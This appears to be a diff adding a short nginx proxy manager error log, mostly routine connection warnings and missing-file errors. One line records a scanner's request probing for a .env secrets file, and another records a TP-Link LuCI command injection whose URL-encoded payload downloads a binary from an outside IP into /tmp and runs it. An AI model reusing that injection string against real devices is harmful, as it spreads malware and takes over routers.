@@ -1,0 +1,14 @@
+2024/07/09 10:39:31 [warn] 176#176: 512 worker_connections are not enough, reusing connections
+2024/07/09 10:39:31 [alert] 176#176: 512 worker_connections are not enough
+2024/07/09 10:39:31 [error] 177#177: *838 recv() failed (104: Connection reset by peer) while reading response header from upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "proxy.masonry.strangled.net", referrer: "http://proxy.masonry.strangled.net/"
+2024/07/09 11:02:08 [warn] 207#207: 512 worker_connections are not enough, reusing connections
+2024/07/09 11:02:08 [alert] 207#207: 512 worker_connections are not enough
+2024/07/09 11:02:08 [error] 207#207: *1759 recv() failed (104: Connection reset by peer) while reading response header from upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "masonry.strangled.net", referrer: "http://masonry.strangled.net/"
+2024/07/09 11:02:16 [error] 207#207: *1768 open() "/var/www/html/docs" failed (2: No such file or directory), client: 41.217.96.37, server: localhost-nginx-proxy-manager, request: "GET /docs HTTP/1.1", host: "masonry.strangled.net"
+2024/07/09 11:07:29 [error] 207#207: *1802 open() "/var/www/html/docs" failed (2: No such file or directory), client: 41.217.96.37, server: localhost-nginx-proxy-manager, request: "GET /docs HTTP/1.1", host: "masonry.strangled.net"
+2024/07/09 11:09:37 [error] 207#207: *1819 open() "/var/www/html/docs" failed (2: No such file or directory), client: 41.217.96.37, server: localhost-nginx-proxy-manager, request: "GET /docs HTTP/1.1", host: "masonry.strangled.net"
+2024/07/09 11:12:12 [error] 227#227: *1842 open() "/var/www/html/.env" failed (2: No such file or directory), client: 57.129.23.166, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "34.125.30.36"
+2024/07/09 11:21:21 [error] 227#227: *1908 open() "/var/www/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 45.128.232.22, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.71.74%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1", host: "34.125.30.36:80"
+2024/07/09 11:51:32 [warn] 183#183: 512 worker_connections are not enough, reusing connections
+2024/07/09 11:51:32 [alert] 183#183: 512 worker_connections are not enough
+2024/07/09 11:51:32 [error] 183#183: *752 recv() failed (104: Connection reset by peer) while reading response header from upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "masonry.strangled.net", referrer: "http://masonry.strangled.net/docs"
